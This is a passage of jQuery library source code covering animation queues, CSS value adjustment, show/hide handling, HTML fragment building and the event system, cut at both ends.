					// automatically dequeued
					if ( type === "fx" ) {
						queue.unshift( "inprogress" );
					}

					// Clear up the last queue stop function
					delete hooks.stop;
					fn.call( elem, next, hooks );
				}

				if ( !startLength && hooks ) {
					hooks.empty.fire();
				}
			},

			// Not public - generate a queueHooks object, or return the current one
			_queueHooks: function( elem, type ) {
				var key = type + "queueHooks";
				return dataPriv.get( elem, key ) || dataPriv.access( elem, key, {
					empty: jQuery.Callbacks( "once memory" ).add( function() {
						dataPriv.remove( elem, [ type + "queue", key ] );
					} )
				} );
			}
		} );

		jQuery.fn.extend( {
			queue: function( type, data ) {
				var setter = 2;

				if ( typeof type !== "string" ) {
					data = type;
					type = "fx";
					setter--;
				}

				if ( arguments.length < setter ) {
					return jQuery.queue( this[ 0 ], type );
				}

				return data === undefined ?
					this :
					this.each( function() {
						var queue = jQuery.queue( this, type, data );

						// Ensure a hooks for this queue
						jQuery._queueHooks( this, type );

						if ( type === "fx" && queue[ 0 ] !== "inprogress" ) {
							jQuery.dequeue( this, type );
						}
					} );
			},
			dequeue: function( type ) {
				return this.each( function() {
					jQuery.dequeue( this, type );
				} );
			},
			clearQueue: function( type ) {
				return this.queue( type || "fx", [] );
			},

			// Get a promise resolved when queues of a certain type
			// are emptied (fx is the type by default)
			promise: function( type, obj ) {
				var tmp,
					count = 1,
					defer = jQuery.Deferred(),
					elements = this,
					i = this.length,
					resolve = function() {
						if ( !( --count ) ) {
							defer.resolveWith( elements, [ elements ] );
						}
					};

				if ( typeof type !== "string" ) {
					obj = type;
					type = undefined;
				}
				type = type || "fx";

				while ( i-- ) {
					tmp = dataPriv.get( elements[ i ], type + "queueHooks" );
					if ( tmp && tmp.empty ) {
						count++;
						tmp.empty.add( resolve );
					}
				}
				resolve();
				return defer.promise( obj );
			}
		} );
		var pnum = ( /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/ ).source;

		var rcssNum = new RegExp( "^(?:([+-])=|)(" + pnum + ")([a-z%]*)$", "i" );


		var cssExpand = [ "Top", "Right", "Bottom", "Left" ];

		var documentElement = document.documentElement;



			var isAttached = function( elem ) {
					return jQuery.contains( elem.ownerDocument, elem );
				},
				composed = { composed: true };

			// Support: IE 9 - 11+, Edge 12 - 18+, iOS 10.0 - 10.2 only
			// Check attachment across shadow DOM boundaries when possible (gh-3504)
			// Support: iOS 10.0-10.2 only
			// Early iOS 10 versions support `attachShadow` but not `getRootNode`,
			// leading to errors. We need to check for `getRootNode`.
			if ( documentElement.getRootNode ) {
				isAttached = function( elem ) {
					return jQuery.contains( elem.ownerDocument, elem ) ||
						elem.getRootNode( composed ) === elem.ownerDocument;
				};
			}
		var isHiddenWithinTree = function( elem, el ) {

				// isHiddenWithinTree might be called from jQuery#filter function;
				// in that case, element will be second argument
				elem = el || elem;

				// Inline style trumps all
				return elem.style.display === "none" ||
					elem.style.display === "" &&

					// Otherwise, check computed style
					// Support: Firefox <=43 - 45
					// Disconnected elements can have computed display: none, so first confirm that elem is
					// in the document.
					isAttached( elem ) &&

					jQuery.css( elem, "display" ) === "none";
			};



		function adjustCSS( elem, prop, valueParts, tween ) {
			var adjusted, scale,
				maxIterations = 20,
				currentValue = tween ?
					function() {
						return tween.cur();
					} :
					function() {
						return jQuery.css( elem, prop, "" );
					},
				initial = currentValue(),
				unit = valueParts && valueParts[ 3 ] || ( jQuery.cssNumber[ prop ] ? "" : "px" ),

				// Starting value computation is required for potential unit mismatches
				initialInUnit = elem.nodeType &&
					( jQuery.cssNumber[ prop ] || unit !== "px" && +initial ) &&
					rcssNum.exec( jQuery.css( elem, prop ) );

			if ( initialInUnit && initialInUnit[ 3 ] !== unit ) {

				// Support: Firefox <=54
				// Halve the iteration target value to prevent interference from CSS upper bounds (gh-2144)
				initial = initial / 2;

				// Trust units reported by jQuery.css
				unit = unit || initialInUnit[ 3 ];

				// Iteratively approximate from a nonzero starting point
				initialInUnit = +initial || 1;

				while ( maxIterations-- ) {

					// Evaluate and update our best guess (doubling guesses that zero out).
					// Finish if the scale equals or crosses 1 (making the old*new product non-positive).
					jQuery.style( elem, prop, initialInUnit + unit );
					if ( ( 1 - scale ) * ( 1 - ( scale = currentValue() / initial || 0.5 ) ) <= 0 ) {
						maxIterations = 0;
					}
					initialInUnit = initialInUnit / scale;

				}

				initialInUnit = initialInUnit * 2;
				jQuery.style( elem, prop, initialInUnit + unit );

				// Make sure we update the tween properties later on
				valueParts = valueParts || [];
			}

			if ( valueParts ) {
				initialInUnit = +initialInUnit || +initial || 0;

				// Apply relative offset (+=/-=) if specified
				adjusted = valueParts[ 1 ] ?
					initialInUnit + ( valueParts[ 1 ] + 1 ) * valueParts[ 2 ] :
					+valueParts[ 2 ];
				if ( tween ) {
					tween.unit = unit;
					tween.start = initialInUnit;
					tween.end = adjusted;
				}
			}
			return adjusted;
		}


		var defaultDisplayMap = {};

		function getDefaultDisplay( elem ) {
			var temp,
				doc = elem.ownerDocument,
				nodeName = elem.nodeName,
				display = defaultDisplayMap[ nodeName ];

			if ( display ) {
				return display;
			}

			temp = doc.body.appendChild( doc.createElement( nodeName ) );
			display = jQuery.css( temp, "display" );

			temp.parentNode.removeChild( temp );

			if ( display === "none" ) {
				display = "block";
			}
			defaultDisplayMap[ nodeName ] = display;

			return display;
		}

		function showHide( elements, show ) {
			var display, elem,
				values = [],
				index = 0,
				length = elements.length;

			// Determine new display value for elements that need to change
			for ( ; index < length; index++ ) {
				elem = elements[ index ];
				if ( !elem.style ) {
					continue;
				}

				display = elem.style.display;
				if ( show ) {

					// Since we force visibility upon cascade-hidden elements, an immediate (and slow)
					// check is required in this first loop unless we have a nonempty display value (either
					// inline or about-to-be-restored)
					if ( display === "none" ) {
						values[ index ] = dataPriv.get( elem, "display" ) || null;
						if ( !values[ index ] ) {
							elem.style.display = "";
						}
					}
					if ( elem.style.display === "" && isHiddenWithinTree( elem ) ) {
						values[ index ] = getDefaultDisplay( elem );
					}
				} else {
					if ( display !== "none" ) {
						values[ index ] = "none";

						// Remember what we're overwriting
						dataPriv.set( elem, "display", display );
					}
				}
			}

			// Set the display of the elements in a second loop to avoid constant reflow
			for ( index = 0; index < length; index++ ) {
				if ( values[ index ] != null ) {
					elements[ index ].style.display = values[ index ];
				}
			}

			return elements;
		}

		jQuery.fn.extend( {
			show: function() {
				return showHide( this, true );
			},
			hide: function() {
				return showHide( this );
			},
			toggle: function( state ) {
				if ( typeof state === "boolean" ) {
					return state ? this.show() : this.hide();
				}

				return this.each( function() {
					if ( isHiddenWithinTree( this ) ) {
						jQuery( this ).show();
					} else {
						jQuery( this ).hide();
					}
				} );
			}
		} );
		var rcheckableType = ( /^(?:checkbox|radio)$/i );

		var rtagName = ( /<([a-z][^\/\0>\x20\t\r\n\f]*)/i );

		var rscriptType = ( /^$|^module$|\/(?:java|ecma)script/i );



		( function() {
			var fragment = document.createDocumentFragment(),
				div = fragment.appendChild( document.createElement( "div" ) ),
				input = document.createElement( "input" );

			// Support: Android 4.0 - 4.3 only
			// Check state lost if the name is set (trac-11217)
			// Support: Windows Web Apps (WWA)
			// `name` and `type` must use .setAttribute for WWA (trac-14901)
			input.setAttribute( "type", "radio" );
			input.setAttribute( "checked", "checked" );
			input.setAttribute( "name", "t" );

			div.appendChild( input );

			// Support: Android <=4.1 only
			// Older WebKit doesn't clone checked state correctly in fragments
			support.checkClone = div.cloneNode( true ).cloneNode( true ).lastChild.checked;

			// Support: IE <=11 only
			// Make sure textarea (and checkbox) defaultValue is properly cloned
			div.innerHTML = "<textarea>x</textarea>";
			support.noCloneChecked = !!div.cloneNode( true ).lastChild.defaultValue;

			// Support: IE <=9 only
			// IE <=9 replaces <option> tags with their contents when inserted outside of
			// the select element.
			div.innerHTML = "<option></option>";
			support.option = !!div.lastChild;
		} )();


		// We have to close these tags to support XHTML (trac-13200)
		var wrapMap = {

			// XHTML parsers do not magically insert elements in the
			// same way that tag soup parsers do. So we cannot shorten
			// this by omitting <tbody> or other required elements.
			thead: [ 1, "<table>", "</table>" ],
			col: [ 2, "<table><colgroup>", "</colgroup></table>" ],
			tr: [ 2, "<table><tbody>", "</tbody></table>" ],
			td: [ 3, "<table><tbody><tr>", "</tr></tbody></table>" ],

			_default: [ 0, "", "" ]
		};

		wrapMap.tbody = wrapMap.tfoot = wrapMap.colgroup = wrapMap.caption = wrapMap.thead;
		wrapMap.th = wrapMap.td;

		// Support: IE <=9 only
		if ( !support.option ) {
			wrapMap.optgroup = wrapMap.option = [ 1, "<select multiple='multiple'>", "</select>" ];
		}


		function getAll( context, tag ) {

			// Support: IE <=9 - 11 only
			// Use typeof to avoid zero-argument method invocation on host objects (trac-15151)
			var ret;

			if ( typeof context.getElementsByTagName !== "undefined" ) {
				ret = context.getElementsByTagName( tag || "*" );

			} else if ( typeof context.querySelectorAll !== "undefined" ) {
				ret = context.querySelectorAll( tag || "*" );

			} else {
				ret = [];
			}

			if ( tag === undefined || tag && nodeName( context, tag ) ) {
				return jQuery.merge( [ context ], ret );
			}

			return ret;
		}


		// Mark scripts as having already been evaluated
		function setGlobalEval( elems, refElements ) {
			var i = 0,
				l = elems.length;

			for ( ; i < l; i++ ) {
				dataPriv.set(
					elems[ i ],
					"globalEval",
					!refElements || dataPriv.get( refElements[ i ], "globalEval" )
				);
			}
		}


		var rhtml = /<|&#?\w+;/;

		function buildFragment( elems, context, scripts, selection, ignored ) {
			var elem, tmp, tag, wrap, attached, j,
				fragment = context.createDocumentFragment(),
				nodes = [],
				i = 0,
				l = elems.length;

			for ( ; i < l; i++ ) {
				elem = elems[ i ];

				if ( elem || elem === 0 ) {

					// Add nodes directly
					if ( toType( elem ) === "object" ) {

						// Support: Android <=4.0 only, PhantomJS 1 only
						// push.apply(_, arraylike) throws on ancient WebKit
						jQuery.merge( nodes, elem.nodeType ? [ elem ] : elem );

					// Convert non-html into a text node
					} else if ( !rhtml.test( elem ) ) {
						nodes.push( context.createTextNode( elem ) );

					// Convert html into DOM nodes
					} else {
						tmp = tmp || fragment.appendChild( context.createElement( "div" ) );

						// Deserialize a standard representation
						tag = ( rtagName.exec( elem ) || [ "", "" ] )[ 1 ].toLowerCase();
						wrap = wrapMap[ tag ] || wrapMap._default;
						tmp.innerHTML = wrap[ 1 ] + jQuery.htmlPrefilter( elem ) + wrap[ 2 ];

						// Descend through wrappers to the right content
						j = wrap[ 0 ];
						while ( j-- ) {
							tmp = tmp.lastChild;
						}

						// Support: Android <=4.0 only, PhantomJS 1 only
						// push.apply(_, arraylike) throws on ancient WebKit
						jQuery.merge( nodes, tmp.childNodes );

						// Remember the top-level container
						tmp = fragment.firstChild;

						// Ensure the created nodes are orphaned (trac-12392)
						tmp.textContent = "";
					}
				}
			}

			// Remove wrapper from fragment
			fragment.textContent = "";

			i = 0;
			while ( ( elem = nodes[ i++ ] ) ) {

				// Skip elements already in the context collection (trac-4087)
				if ( selection && jQuery.inArray( elem, selection ) > -1 ) {
					if ( ignored ) {
						ignored.push( elem );
					}
					continue;
				}

				attached = isAttached( elem );

				// Append to fragment
				tmp = getAll( fragment.appendChild( elem ), "script" );

				// Preserve script evaluation history
				if ( attached ) {
					setGlobalEval( tmp );
				}

				// Capture executables
				if ( scripts ) {
					j = 0;
					while ( ( elem = tmp[ j++ ] ) ) {
						if ( rscriptType.test( elem.type || "" ) ) {
							scripts.push( elem );
						}
					}
				}
			}

			return fragment;
		}


		var rtypenamespace = /^([^.]*)(?:\.(.+)|)/;

		function returnTrue() {
			return true;
		}

		function returnFalse() {
			return false;
		}

		function on( elem, types, selector, data, fn, one ) {
			var origFn, type;

			// Types can be a map of types/handlers
			if ( typeof types === "object" ) {

				// ( types-Object, selector, data )
				if ( typeof selector !== "string" ) {

					// ( types-Object, data )
					data = data || selector;
					selector = undefined;
				}
				for ( type in types ) {
					on( elem, type, selector, data, types[ type ], one );
				}
				return elem;
			}

			if ( data == null && fn == null ) {

				// ( types, fn )
				fn = selector;
				data = selector = undefined;
			} else if ( fn == null ) {
				if ( typeof selector === "string" ) {

					// ( types, selector, fn )
					fn = data;
					data = undefined;
				} else {

					// ( types, data, fn )
					fn = data;
					data = selector;
					selector = undefined;
				}
			}
			if ( fn === false ) {
				fn = returnFalse;
			} else if ( !fn ) {
				return elem;
			}

			if ( one === 1 ) {
				origFn = fn;
				fn = function( event ) {

					// Can use an empty set, since event contains the info
					jQuery().off( event );
					return origFn.apply( this, arguments );
				};

				// Use same guid so caller can remove using origFn
				fn.guid = origFn.guid || ( origFn.guid = jQuery.guid++ );
			}
			return elem.each( function() {
				jQuery.event.add( this, types, fn, data, selector );
			} );
		}

		/*
		 * Helper functions for managing events -- not part of the public interface.
		 * Props to Dean Edwards' addEvent library for many of the ideas.
		 */
		jQuery.event = {

			global: {},

			add: function( elem, types, handler, data, selector ) {

				var handleObjIn, eventHandle, tmp,
					events, t, handleObj,
					special, handlers, type, namespaces, origType,
					elemData = dataPriv.get( elem );

				// Only attach events to objects that accept data
				if ( !acceptData( elem ) ) {
					return;
				}

				// Caller can pass in an object of custom data in lieu of the handler
				if ( handler.handler ) {
					handleObjIn = handler;
					handler = handleObjIn.handler;
					selector = handleObjIn.selector;
				}

				// Ensure that invalid selectors throw exceptions at attach time
				// Evaluate against documentElement in case elem is a non-element node (e.g., document)
				if ( selector ) {
					jQuery.find.matchesSelector( documentElement, selector );
				}

				// Make sure that the handler has a unique ID, used to find/remove it later
				if ( !handler.guid ) {
					handler.guid = jQuery.guid++;
				}

				// Init the element's event structure and main handler, if this is the first
				if ( !( events = elemData.events ) ) {
					events = elemData.events = Object.create( null );
				}
				if ( !( eventHandle = elemData.handle ) ) {
					eventHandle = elemData.handle = function( e ) {

						// Discard the second event of a jQuery.event.trigger() and
						// when an event is called after a page has unloaded
						return typeof jQuery !== "undefined" && jQuery.event.triggered !== e.type ?
							jQuery.event.dispatch.apply( elem, arguments ) : undefined;
					};
				}

				// Handle multiple events separated by a space
				types = ( types || "" ).match( rnothtmlwhite ) || [ "" ];
				t = types.length;
				while ( t-- ) {
					tmp = rtypenamespace.exec( types[ t ] ) || [];
					type = origType = tmp[ 1 ];
					namespaces = ( tmp[ 2 ] || "" ).split( "." ).sort();

					// There *must* be a type, no attaching namespace-only handlers
					if ( !type ) {
						continue;
					}

					// If event changes its type, use the special event handlers for the changed type
					special = jQuery.event.special[ type ] || {};

					// If selector defined, determine special event api type, otherwise given type
					type = ( selector ? special.delegateType : special.bindType ) || type;

					// Update special based on newly reset type
					special = jQuery.event.special[ type ] || {};

					// handleObj is passed to all event handlers
					handleObj = jQuery.extend( {
						type: type,
						origType: origType,
						data: data,
						handler: handler,
						guid: handler.guid,
						selector: selector,
						needsContext: selector && jQuery.expr.match.needsContext.test( selector ),
						namespace: namespaces.join( "." )
					}, handleObjIn );

					// Init the event handler queue if we're the first
					if ( !( handlers = events[ type ] ) ) {
						handlers = events[ type ] = [];
						handlers.delegateCount = 0;

						// Only use addEventListener if the special events handler returns false
						if ( !special.setup ||
							special.setup.call( elem, data, namespaces, eventHandle ) === false ) {

							if ( elem.addEventListener ) {
								elem.addEventListener( type, eventHandle );
							}
						}
					}

					if ( special.add ) {
						special.add.call( elem, handleObj );

						if ( !handleObj.handler.guid ) {
							handleObj.handler.guid = handler.guid;
						}
					}

					// Add to the element's handler list, delegates in front
					if ( selector ) {
						handlers.splice( handlers.delegateCount++, 0, handleObj );
					} else {
						handlers.push( handleObj );
					}

					// Keep track of which events have ever been used, for event optimization
					jQuery.event.global[ type ] = true;
				}

			},

			// Detach an event or set of events from an element
			remove: function( elem, types, handler, selector, mappedTypes ) {

				var j, origCount, tmp,
					events, t, handleObj,
					special, handlers, type, namespaces, origType,
					elemData = dataPriv.hasData( elem ) && dataPriv.get( elem );

				if ( !elemData || !( events = elemData.events ) ) {
					return;
				}

				// Once for each type.namespace in types; type may be omitted
				types = ( types || "" ).match( rnothtmlwhite ) || [ "" ];
				t = types.length;
				while ( t-- ) {
					tmp = rtypenamespace.exec( types[ t ] ) || [];
					type = origType = tmp[ 1 ];
					namespaces = ( tmp[ 2 ] || "" ).split( "." ).sort();

					// Unbind all events (on this namespace, if provided) for the element
					if ( !type ) {
						for ( type in events ) {
							jQuery.event.remove( elem, type + types[ t ], handler, selector, true );
						}
						continue;
					}

					special = jQuery.event.special[ type ] || {};
					type = ( selector ? special.delegateType : special.bindType ) || type;
					handlers = events[ type ] || [];
					tmp = tmp[ 2 ] &&
						new RegExp( "(^|\\.)" + namespaces.join( "\\.(?:.*\\.|)" ) + "(\\.|$)" );

					// Remove matching events
					origCount = j = handlers.length;
					while ( j-- ) {
						handleObj = handlers[ j ];

						if ( ( mappedTypes || origType === handleObj.origType ) &&
							( !handler || handler.guid === handleObj.guid ) &&
							( !tmp || tmp.test( handleObj.namespace ) ) &&
							( !selector || selector === handleObj.selector ||
								selector === "**" && handleObj.selector ) ) {
							handlers.splice( j, 1 );

							if ( handleObj.selector ) {
								handlers.delegateCount--;
							}
							if ( special.remove ) {
								special.remove.call( elem, handleObj );
							}
						}
					}

					// Remove generic event handler if we removed something and no more handlers exist
					// (avoids potential for endless recursion during removal of special event handlers)
					if ( origCount && !handlers.length ) {
						if ( !special.teardown ||
							special.teardown.call( elem, namespaces, elemData.handle ) === false ) {

							jQuery.removeEvent( elem, type, elemData.handle );
						}

						delete events[ type ];
					}
				}

				// Remove data and the expando if it's no longer used
				if ( jQuery.isEmptyObject( events ) ) {
					dataPriv.remove( elem, "handle events" );
				}
			},

			dispatch: function( nativeEvent ) {

				var i, j, ret, matched, handleObj, handlerQueue,
					args = new Array( arguments.length ),

					// Make a writable jQuery.Event from the native event object
					event = jQuery.event.fix( nativeEvent ),

					handlers = (
						dataPriv.get( this, "events" ) || Object.create( null )
					)[ event.type ] || [],
					special = jQuery.event.special[ event.type ] || {};

				// Use the fix-ed jQuery.Event rather than the (read-only) native event
				args[ 0 ] = event;

				for ( i = 1; i < arguments.length; i++ ) {
					args[ i ] = arguments[ i ];
				}

				event.delegateTarget = this;

				// Call the preDispatch hook for the mapped type, and let it bail if desired
				if ( special.preDispatch && special.preDispatch.call( this, event ) === false ) {
					return;
				}

				// Determine handlers
				handlerQueue = jQuery.event.handlers.call( this, event, handlers );

				// Run delegates first; they may want to stop propagation beneath us
				i = 0;
				while ( ( matched = handlerQueue[ i++ ] ) && !event.isPropagationStopped() ) {
					event.currentTarget = matched.elem;

					j = 0;
					while ( ( handleObj = matched.handlers[ j++ ] ) &&
						!event.isImmediatePropagationStopped() ) {

						// If the event is namespaced, then each handler is only invoked if it is
						// specially universal or its namespaces are a superset of the event's.
						if ( !event.rnamespace || handleObj.namespace === false ||
							event.rnamespace.test( handleObj.namespace ) ) {

							event.handleObj = handleObj;
							event.data = handleObj.data;

							ret = ( ( jQuery.event.special[ handleObj.origType ] || {} ).handle ||
								handleObj.handler ).apply( matched.elem, args );

							if ( ret !== undefined ) {
								if ( ( event.result = ret ) === false ) {
									event.preventDefault();
									event.stopPropagation();
								}
							}
						}
					}
				}

				// Call the postDispatch hook for the mapped type
				if ( special.postDispatch ) {
					special.postDispatch.call( this, event );
				}

				return event.result;
			},

			handlers: function( event, handlers ) {
				var i, handleObj, sel, matchedHandlers, matchedSelectors,
					handlerQueue = [],
					delegateCount = handlers.delegateCount,
					cur = event.target;

				// Find delegate handlers
				if ( delegateCount &&

					// Support: IE <=9
					// Black-hole SVG <use> instance trees (trac-13180)
					cur.nodeType &&

					// Support: Firefox <=42
					// Suppress spec-violating clicks indicating a non-primary pointer button (trac-3861)
					// https://www.w3.org/TR/DOM-Level-3-Events/#event-type-click
					// Support: IE 11 only
					// ...but not arrow key "clicks" of radio inputs, which can have `button` -1 (gh-2343)
					!( event.type === "click" && event.button >= 1 ) ) {

					for ( ; cur !== this; cur = cur.parentNode || this ) {

						// Don't check non-elements (trac-13208)
						// Don't process clicks on disabled elements (trac-6911, trac-8165, trac-11382, trac-11764)
						if ( cur.nodeType === 1 && !( event.type === "click" && cur.disabled === true ) ) {
							matchedHandlers = [];
							matchedSelectors = {};
							for ( i = 0; i < delegateCount; i++ ) {
								handleObj = handlers[ i ];

								// Don't conflict with Object.prototype properties (trac-13203)
								sel = handleObj.selector + " ";

								if ( matchedSelectors[ sel ] === undefined ) {
									matchedSelectors[ sel ] = handleObj.needsContext ?
										jQuery( sel, this ).index( cur ) > -1 :
										jQuery.find( sel, this, null, [ cur ] ).length;
								}
								if ( matchedSelectors[ sel ] ) {
									matchedHandlers.push( handleObj );
								}
							}
							if ( matchedHandlers.length ) {
								handlerQueue.push( { elem: cur, handlers: matchedHandlers } );
							}
						}
					}
				}

				// Add the remaining (directly-bound) handlers
				cur = this;
				if ( delegateCount < handlers.length ) {
					handlerQueue.push( { elem: cur, handlers: handlers.slice( delegateCount ) } );
				}

				return handlerQueue;
			},

			addProp: function( name, hook ) {
				Object.defineProperty( jQuery.Event.prototype, name, {
					enumerable: true,
					configurable: true,

					get: isFunction( hook ) ?
						function() {
							if ( this.originalEvent ) {
								return hook( this.originalEvent );
							}
						} :
						function() {
							if ( this.originalEvent ) {
								return this.originalEvent[ name ];
							}
						},

					set: function( value ) {
						Object.defineProperty( this, name, {
							enumerable: true,
							configurable: true,
							writable: true,
							value: value
						} );
					}
				} );
			},

			fix: function( originalEvent ) {
				return originalEvent[ jQuery.expando ] ?
					originalEvent :
					new jQuery.Event( originalEvent );
			},

			special: {
				load: {

					// Prevent triggered image.load events from bubbling to window.load
					noBubble: true
				},
				click: {

					// Utilize native event to ensure correct state for checkable inputs
					setup: function( data ) {

						// For mutual compressibility with _default, replace `this` access with a local var.
						// `|| data` is dead code meant only to preserve the variable through minification.
						var el = this || data;

						// Claim the first handler
						if ( rcheckableType.test( el.type ) &&
							el.click && nodeName( el, "input" ) ) {

							// dataPriv.set( el, "click", ... )
							leverageNative( el, "click", true );
						}

						// Return false to allow normal processing in the caller
						return false;
					},
					trigger: function( data ) {

						// For mutual compressibility with _default, replace `this` access with a local var.
						// `|| data` is dead code meant only to preserve the variable through minification.
						var el = this || data;

						// Force setup before triggering a click
						if ( rcheckableType.test( el.type ) &&
							el.click && nodeName( el, "input" ) ) {

							leverageNative( el, "click" );
						}

						// Return non-false to allow normal event-path propagation
						return true;
					},

					// For cross-browser consistency, suppress native .click() on links
					// Also prevent it if we're currently inside a leveraged native-event stack
					_default: function( event ) {
						var target = event.target;
						return rcheckableType.test( target.type ) &&
							target.click && nodeName( target, "input" ) &&
							dataPriv.get( target, "click" ) ||
							nodeName( target, "a" );
					}
				},

				beforeunload: {
					postDispatch: function( event ) {

						// Support: Firefox 20+
						// Firefox doesn't alert if the returnValue field is not set.
						if ( event.result !== undefined && event.originalEvent ) {
							event.originalEvent.returnValue = event.result;
						}
					}
				}
			}
		};

		// Ensure the presence of an event listener that handles manually-triggered
		// synthetic events by interrupting progress until reinvoked in response to
		// *native* events that it fires directly, ensuring that state changes have
		// already occurred before other listeners are invoked.
		function leverageNative( el, type, isSetup ) {

			// Missing `isSetup` indicates a trigger call, which must force setup through jQuery.event.add
			if ( !isSetup ) {
				if ( dataPriv.get( el, type ) === undefined ) {
					jQuery.event.add( el, type, returnTrue );
				}
				return;
			}

			// Register the controller as a special universal handler for all event namespaces
			dataPriv.set( el, type, false );
			jQuery.event.add( el, type, {
				namespace: false,
				handler: function( event ) {
					var result,
						saved = dataPriv.get( this, type );

					if ( ( event.isTrigger & 1 ) && this[ type ] ) {

						// Interrupt processing of the outer synthetic .trigger()ed event
						if ( !saved ) {

							// Store arguments for use when handling the inner native event
							// There will always be at least one argument (an event object), so this array
							// will not be confused with a leftover capture object.
							saved = slice.call( arguments );
							dataPriv.set( this, type, saved );

							// Trigger the native event and capture its result
							this[ type ]();
							result = dataPriv.get( this, type );
							dataPriv.set( this, type, false );

							if ( saved !== result ) {

								// Cancel the outer synthetic event
								event.stopImmediatePropagation();
								event.preventDefault();

								return result;
							}

						// If this is an inner synthetic event for an event with a bubbling surrogate
						// (focus or blur), assume that the surrogate already propagated from triggering
						// the native event and prevent that from happening again here.
						// This technically gets the ordering wrong w.r.t. to `.trigger()` (in which the
						// bubbling surrogate propagates *after* the non-bubbling base), but that seems
						// less bad than duplication.
						} else if ( ( jQuery.event.special[ type ] || {} ).delegateType ) {
							event.stopPropagation();
						}

					// If this is a native event triggered above, everything is now in order
					// Fire an inner synthetic event with the original arguments
					} else if ( saved ) {

						// ...and capture the result
						dataPriv.set( this, type, jQuery.event.trigger(
							saved[ 0 ],
							saved.slice( 1 ),
							this
						) );

						// Abort handling of the native event by all jQuery handlers while allowing
						// native handlers on the same element to run. On target, this is achieved
						// by stopping immediate propagation just on the jQuery event. However,
						// the native event is re-wrapped by a jQuery one on each level of the
						// propagation so the only way to stop it for jQuery is to stop it for
						// everyone via native `stopPropagation()`. This is not a problem for
						// focus/blur which don't bubble, but it does also stop click on checkboxes
						// and radios. We accept this limitation.
						event.stopPropagation();
						event.isImmediatePropagationStopped = returnTrue;
					}
				}
			} );
		}

		jQuery.removeEvent = function( elem, type, handle ) {

			// This "if" is needed for plain objects
			if ( elem.removeEventListener ) {
				elem.removeEventListener( type, handle );
			}
		};

		jQuery.Event = function( src, props ) {

			// Allow instantiation without the 'new' keyword
			if ( !( this instanceof jQuery.Event ) ) {
				return new jQuery.Event( src, props );
			}

			// Event object
			if ( src && src.type ) {
				this.originalEvent = src;
				this.type = src.type;

				// Events bubbling up the document may have been marked as prevented
				// by a handler lower down the tree; reflect the correct value.
				this.isDefaultPrevented = src.defaultPrevented ||
						src.defaultPrevented === undefined &&

						// Support: Android <=2.3 only
						src.returnValue === false ?
					returnTrue :
					returnFalse;

				// Create target properties
				// Support: Safari <=6 - 7 only
				// Target should not be a text node (trac-504, trac-13143)
				this.target = ( src.target && src.target.nodeType === 3 ) ?
					src.target.parentNode :
					src.target;

				this.currentTarget = src.currentTarget;
				this.relatedTarget = src.relatedTarget;

			// Event type
			} else {
				this.type = src;
			}

			// Put explicitly provided properties onto the event object
			if ( props ) {
				jQuery.extend( this, props );
			}

			// Create a timestamp if incoming event doesn't have one
			this.timeStamp = src && src.timeStamp || Date.now();

			// Mark it as fixed
			this[ jQuery.expando ] = true;
		};

		// jQuery.Event is based on DOM3 Events as specified by the ECMAScript Language Binding
		// https://www.w3.org/TR/2003/WD-DOM-Level-3-Events-20030331/ecma-script-binding.html
		jQuery.Event.prototype = {
			constructor: jQuery.Event,
			isDefaultPrevented: returnFalse,
			isPropagationStopped: returnFalse,
			isImmediatePropagationStopped: returnFalse,
			isSimulated: false,

			preventDefault: function() {
				var e = this.originalEvent;

				this.isDefaultPrevented = returnTrue;

				if ( e && !this.isSimulated ) {
					e.preventDefault();
				}
			},
			stopPropagation: function() {
				var e = this.originalEvent;

				this.isPropagationStopped = returnTrue;

				if ( e && !this.isSimulated ) {
					e.stopPropagation();
				}
			},
			stopImmediatePropagation: function() {
				var e = this.originalEvent;

				this.isImmediatePropagationStopped = returnTrue;

				if ( e && !this.isSimulated ) {
					e.stopImmediatePropagation();
				}

				this.stopPropagation();
			}
		};

		// Includes all common event props including KeyEvent and MouseEvent specific props
		jQuery.each( {
			altKey: true,
			bubbles: true,
			cancelable: true,
			changedTouches: true,
			ctrlKey: true,
			detail: true,
			eventPhase: true,
			metaKey: true,
			pageX: true,
			pageY: true,
			shiftKey: true,
			view: true,
			"char": true,
			code: true,
			charCode: true,
			key: true,
			keyCode: true,
			button: true,
			buttons: true,
			clientX: true,
			clientY: true,
			offsetX: true,
			offsetY: true,
			pointerId: true,
			pointerType: true,
			screenX: true,
			screenY: true,
			targetTouches: true,
			toElement: true,
			touches: true,
			which: true
		}, jQuery.event.addProp );

		jQuery.each( { focus: "focusin", blur: "focusout" }, function( type, delegateType ) {

			function focusMappedHandler( nativeEvent ) {
				if ( document.documentMode ) {

					// Support: IE 11+
					// Attach a single focusin/focusout handler on the document while someone wants
					// focus/blur. This is because the former are synchronous in IE while the latter
					// are async. In other browsers, all those handlers are invoked synchronously.

					// `handle` from private data would already wrap the event, but we need
					// to change the `type` here.
					var handle = dataPriv.get( this, "handle" ),
						event = jQuery.event.fix( nativeEvent );
					event.type = nativeEvent.type === "focusin" ? "focus" : "blur";
					event.isSimulated = true;

					// First, handle focusin/focusout
					handle( nativeEvent );

					// ...then, handle focus/blur
					//
					// focus/blur don't bubble while focusin/focusout do; simulate the former by only
					// invoking the handler at the lower level.
					if ( event.target === event.currentTarget ) {

						// The setup part calls `leverageNative`, which, in turn, calls
						// `jQuery.event.add`, so event handle will already have been set
						// by this point.
						handle( event );
					}
				} else {

					// For non-IE browsers, attach a single capturing handler on the document
					// while someone wants focusin/focusout.
					jQuery.event.simulate( delegateType, nativeEvent.target,
						jQuery.event.fix( nativeEvent ) );
				}
			}

			jQuery.event.special[ type ] = {

				// Utilize native event if possible so blur/focus sequence is correct
				setup: function() {

					var attaches;

					// Claim the first handler
					// dataPriv.set( this, "focus", ... )
					// dataPriv.set( this, "blur", ... )
					leverageNative( this, type, true );

					if ( document.documentMode ) {

						// Support: IE 9 - 11+
						// We use the same native handler for focusin & focus (and focusout & blur)
						// so we need to coordinate setup & teardown parts between those events.
						// Use `delegateType` as the key as `type` is already used by `leverageNative`.
						attaches = dataPriv.get( this, delegateType );
						if ( !attaches ) {
							this.addEventListener( delegateType, focusMappedHandler );
						}
						dataPriv.set( this, delegateType, ( attaches || 0 ) + 1 );
					} else {

						// Return false to allow normal processing in the caller
						return false;
					}
				},
				trigger: function() {

					// Force setup before trigger
					leverageNative( this, type );

					// Return non-false to allow normal event-path propagation
					return true;
				},

				teardown: function() {
					var attaches;

					if ( document.documentMode ) {
						attaches = dataPriv.get( this, delegateType ) - 1;
						if ( !attaches ) {
							this.removeEventListener( delegateType, focusMappedHandler );
